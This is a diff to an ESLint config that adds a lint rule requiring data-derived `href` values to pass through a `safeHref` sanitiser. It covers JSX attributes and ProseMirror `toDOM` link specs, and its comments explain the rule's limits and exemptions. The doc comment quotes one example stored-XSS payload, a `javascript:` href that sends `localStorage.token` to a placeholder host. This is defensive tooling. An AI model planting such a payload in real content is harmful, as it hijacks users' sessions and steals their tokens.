@@ -124,6 +124,62 @@ function dsPropSelectors() {
   }));
 }
 
+/**
+ * An `href` built from stored data, with nothing between it and the DOM.
+ *
+ * ## The class this catches
+ *
+ * `href="javascript:fetch('//x/'+localStorage.token)"` is script execution in the app's own origin,
+ * one click away, from anybody who can write a string anywhere it is rendered — a post body, a
+ * profile field, a space description. `safeHref` was written for exactly that in #118 and applied
+ * to `we-link` and `we-button`; the content layer then added a *third* renderer of a stored href —
+ * the ProseMirror link mark's `toDOM`, which builds a live `<a>` from a mark a peer wrote — and it
+ * went in raw. Two audits apart, the same class, in a renderer written after the fix.
+ *
+ * So the rule is about the shape rather than about the file: anything setting an `href` from an
+ * expression has to name `safeHref` in it. A literal is exempt — `href="/about"` cannot switch
+ * protocol — and so is a call to `safeHref` itself, which is the point.
+ *
+ * Matches both spellings a renderer uses: a JSX attribute, and an object property in a `toDOM`-style
+ * array. It cannot see through a variable, so a value laundered through one still gets past; that is
+ * the limit of a syntactic rule, and it still closes the case that has now happened twice.
+ */
+function hrefSelectors() {
+  const message =
+    'An href built from data must go through safeHref (@we/design-utils) — a stored string can be ' +
+    '`javascript:`, which is script in this origin. A literal path needs nothing.';
+  /*
+    Two primitives and the router are exempt, because they are where the check already happens.
+
+    `we-link` and `we-button` run `safeHref` on their own `href` — that is what #118 built and why
+    the vast majority of links in the app are safe without their call sites knowing. Requiring the
+    caller to sanitise as well would be asking every consumer to distrust the primitive, which is
+    the opposite of why the primitive has it. `Navigate` is `@solidjs/router`'s, and its `href` is a
+    route path rather than a URL: it never reaches the DOM as one.
+  */
+  const SANITISING = '^(we-link|we-button|Navigate)$';
+  return [
+    {
+      selector:
+        `JSXOpeningElement:not([name.name=/${SANITISING}/]) > JSXAttribute[name.name="href"] ` +
+        '> JSXExpressionContainer[expression.callee.name!="safeHref"] > :not(JSXEmptyExpression)',
+      message,
+    },
+    /*
+      A DOM spec — `['a', { href }, 0]` — which is the ProseMirror `toDOM` shape and the one that
+      actually got past everything else. Narrow on purpose: a bare `href:` property matches a schema
+      node's props, a mark's stored attrs and half a dozen already-sanitised locals, and a rule that
+      fires on all of those is a rule people turn off. This fires where an `<a>` is being built.
+    */
+    {
+      selector:
+        'ArrayExpression[elements.0.value="a"] > ObjectExpression > ' +
+        'Property[key.name="href"][value.callee.name!="safeHref"][value.type!="Literal"]',
+      message,
+    },
+  ];
+}
+
 export default [
   {
     ignores: [
@@ -241,6 +297,15 @@ export default [
     ],
     rules: {
       'no-restricted-syntax': ['error', ...dsPropSelectors()],
+    },
+  },
+  {
+    // Every package that renders. See `hrefSelectors` for what this is about and what it cannot see.
+    name: 'we/href-through-safe-href',
+    files: ['packages/**/src/**/*.ts', 'packages/**/src/**/*.tsx', 'apps/**/src/**/*.ts', 'apps/**/src/**/*.tsx'],
+    ignores: ['**/*.test.ts', '**/*.test.tsx'],
+    rules: {
+      'no-restricted-syntax': ['error', ...hrefSelectors()],
     },
   },
   {
